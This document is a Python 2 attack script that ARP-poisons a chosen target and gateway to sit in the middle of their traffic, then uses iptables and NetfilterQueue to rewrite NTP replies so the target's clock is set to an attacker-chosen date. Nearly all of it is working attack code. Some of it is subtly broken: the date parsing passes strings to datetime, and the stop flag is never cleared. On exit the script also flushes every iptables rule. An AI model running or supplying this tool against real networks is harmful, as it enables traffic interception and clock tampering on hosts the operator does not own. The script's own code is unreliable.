#!/usr/bin/python2

import logging
# Avoid: WARNING: No route found for IPv6 destination :: (no default route?)
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
import sys
import threading
import getopt
from netfilterqueue import NetfilterQueue
import os
import binascii
from datetime import timedelta


class NTPSpoof:
     
    def __init__(self):
        self.poison = True

        
        # add on 20 years on timestamps
        self.offset = 0 
        self.target_ip = ""
        self.gateway_ip = ""
        self.target_mac = ""
        self.gateway_mac = ""
        self.interface = ""

    
    #prints usage
    def usage(self):
        print "Usage: " + sys.argv[0] + "  [-h] [-v][-t <targetIP>]\
     [-g <gatewayIP>] [-i <interface>]\n"
        print "-h, --help \t\t\t print usage\n"
        print "-v, --verbose \t\t\t enable verbose output\n"
        print "-t, --target <targetIP> \t specify target IP address"
        print "-g, --gateway <gatewayIP> \t specify gateway IP address"
        print "-i, --interface  <interface> \t specify interface"
        print "-d, --date  <HH:MM-DD.MM.YYYY> \t specify time you want to spoof"
    
    
    # returns commandline options
    def getCommandlineOpts(self,argv):
        # disable verbose as default
        conf.verb = 0
    
        try:
            opts, args = getopt.getopt(argv, "hvt:g:i:d:", ["help", "verbose",
                "target", "gateway", "interface", "date"])
        except getopt.GetoptError:
            self.usage()
            sys.exit(1)
    
        if not opts:
            self.usage()
            sys.exit()
    
        for opt, arg in opts:
            if opt in ("-h", "--help"):
                self.usage()
                sys.exit()
            elif opt in ("-v", "--verbose"):
                # set scapy verbose option
                conf.verb = 1
            elif opt in ("-t", "--target"):
                # set target ip
                self.target_ip = arg
            elif opt in ("-g", "--gateway"):
                # set gateway ip
                self.gateway_ip = arg
            elif opt in ("-i", "--interface"):
                # set interface
                self.interface = arg
                conf.iface = arg
            elif opt in ("-d", "--date"):
                # set interface
                time, date = arg.split("-")
                hour, minute = time.split(":")
                day, month, year = date.split(".")
                dt = datetime(year, month, day, hour, minute)
                self.offset = (dt - datetime(1900, 1, 1)) / timedelta(seconds=1)
            else:
                self.usage()
                sys.exit(1)
    
    # restores the arp-cache after an mitm attack
    def restoreTarget(self):
        # send spoofed arp-packets to restore correct arp caches:
        # op=#: operation, request=1, reply=2
        # psrc=IP: sender protocol(ip) address
        # pdest=IP: reciever protocol(ip) address
        # hwdst=MAC: reciever hardware(MAC) address (Broadcast)
        # hwsrc=MAC: sender hardware(MAC) address
        # count=#: number of packets send
    
        send(ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip,
            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateway_mac),count=5)
        send(ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, 
            hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac),count=5)
    
    # returns the corresponding mac-address for a given ip-address
    def getMac(self, ip_address):
       
        # send and receive broadcast arp-requests, adjust timeout and retry
        responses, unanswered = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_address), timeout=5, retry=20)
       
        # return corresponding mac address
        for s,r in responses:
            return r[Ether].src
    
        return None
    
    # poisons the arp-cache for a mitm attack
    def poisonTarget(self):
    
        # send spoofed arp-packets for poisoning arp caches:
        # op=#: operation, request=1, reply=2
        # psrc=IP: sender protocol(ip) address
        # pdest=IP: reciever protocol(ip) address
        # hwdst=MAC: reciever hardware(MAC) address (Broadcast)
        # hwsrc=MAC: sender hardware(MAC) address, own mac address is used for MITM 
        poison_target = ARP()
        poison_target.op = 2
        poison_target.psrc = self.gateway_ip
        poison_target.pdst = self.target_ip
        poison_target.hwdst = self.target_mac
    
        poison_gatway = ARP()
        poison_gatway.op = 2
        poison_gatway.psrc = self.target_ip
        poison_gatway.pdst = self.gateway_ip
        poison_gatway.hwdst = self.gateway_mac
    
        print "[===>] Starting ARP-Cache-Poisoning. Stop with [Ctrl-C]"
        
        # poison, send every 2 seconds
        while self.poison:
            send(poison_target)
            send(poison_gatway)
    
            time.sleep(2)
        
        print "[===>] Stopping ARP-Cache-Poisoning."
        return
    
    # spoofes ntp-replies
    def send_spoofed(self, packet, orig_packet):
        try:
            # get NTP frame
            packet[UDP].decode_payload_as(NTP) 
            
            # alter the ntp-timestamps
            packet[NTP].ref = (packet[NTP].ref & 0xffffffff) | (self.offset << 32)
            packet[NTP].recv = (packet[NTP].recv & 0xffffffff) | (self.offset << 32)
            packet[NTP].sent = (packet[NTP].sent & 0xffffffff) | (self.offset << 32)
           
            # recreate packet with manipulated ntp-frame
            spoofed_packet = IP(src=packet[IP].src, 
                    dst=packet[IP].dst)/UDP(sport=packet[UDP].sport,
                    dport=packet[UDP].dport)/packet[NTP]
            
            # replace queue-packet with the altered one
            orig_packet.set_payload(str(spoofed_packet))
    
            # send packet
            orig_packet.accept()
            print "[===>] Spoofed NTP-reply from %s \t-->\t %s" %(packet[IP].src, packet[IP].dst)
    
        except Exception, ex:
            print "[ERROR] When trying to spoof: " + str(ex)
        
    # checks every packet for ntp-relies
    def callback(self, pkt):
        packet = IP(pkt.get_payload())
        if packet[IP].src == self.target_ip:
            pkt.accept()
            return
    
        if packet.haslayer(UDP):
            if packet[UDP].sport == 123 or packet[UDP].dport == 123:
                self.send_spoofed(packet,pkt)
            else:
                pkt.accept()
    
        else:
            pkt.accept()
    

def main(argv):

    spoofer = NTPSpoof()
    spoofer.getCommandlineOpts(argv)
    print "[===>] Using %s interface" % spoofer.interface

    # trying to resolve gateway mac 
    spoofer.gateway_mac = spoofer.getMac(spoofer.gateway_ip)

    if spoofer.gateway_mac is None:
        print "[ERROR] Couldn't receive gateway MAC."
        sys.exit()
    else:
        print "[===>] Gatway: IP=%s | MAC=%s " % (spoofer.gateway_ip,
                spoofer.gateway_mac)

    # trying to resolve target mac 
    spoofer.target_mac = spoofer.getMac(spoofer.target_ip)

    if spoofer.target_mac is None:
        print "[ERROR] Couldn't receive target MAC."
        sys.exit()
    else:
        print "[===>] Target: IP=%s | MAC=%s " % (spoofer.target_ip,
                spoofer.target_mac)

    # start poisoning in different thread
    poison_thread = threading.Thread(target = spoofer.poisonTarget)
    poison_thread.start()
    
    # put incoming ntp-replies into a queue for manipulation
    print "[===>] Setting iptables for queuing"
    os.system('iptables -A FORWARD -j NFQUEUE --queue-num 1')
    
    # create netfilterqueue interface and bind to nfqueue #1 
    nfqueue = NetfilterQueue()
    nfqueue.bind(1,spoofer.callback)

    try:
        # run queue
        nfqueue.run() 
    
    except KeyboardInterrupt:
        # unbind nfqueue and reset iptables
        print "[===>] Resetting iptables"
        nfqueue.unbind()
        os.system('iptables -F')

 
    
    finally:
        
        # stop poisoning and wait for thread
        POISON = False
        time.sleep(2)

        # restore after poisoning
        print "[===>] Restoring targets ARP-Cache"
        spoofer.restoreTarget()
        sys.exit()


    
if __name__ == "__main__":
    main(sys.argv[1:])

